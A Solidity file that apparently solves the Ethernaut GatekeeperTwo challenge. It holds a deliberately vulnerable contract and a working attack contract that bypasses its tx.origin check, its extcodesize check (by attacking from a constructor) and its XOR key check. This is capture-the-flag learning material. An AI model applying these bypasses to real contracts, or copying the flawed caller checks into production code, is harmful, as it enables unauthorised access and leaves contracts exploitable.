// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract GatekeeperTwo {

  address public entrant;

  // to bypass first gate, call enter() via attack contract
  // msg.sender = attack contract
  // tx.origin  = user invoking attack contract
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  // this check tries to verify that the caller is not a contract
  // by checking the code size of the caller. However extcodesize()
  // returns 0 during a contract's constructor, so bypass this
  // check by doing the attack within attack contract's constructor
  // https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/
  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  // see attack contract
  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

// solution used by unit test
contract GatekeeperTwoAttack {
   GatekeeperTwo vulnContract;

  constructor(address _vulnContract) {
    vulnContract =  GatekeeperTwo(_vulnContract);
    attack();
  }

  function attack() private {
    // to work out solution copy vulnerable contract
    // checking code & calculcate the key
    // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
    uint64 x1 = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    // x1 ^ uint64(_gateKey)      == type(uint64).max
    // x1 ^ x1 ^ uint64(_gateKey) == x1 ^ type(uint64).max
    // uint64(_gateKey)           == x1 ^ type(uint64).max (since x1 ^ x1 ^ b = b)

    require(vulnContract.enter(bytes8(x1 ^ type(uint64).max)), "attack failed");
  }
}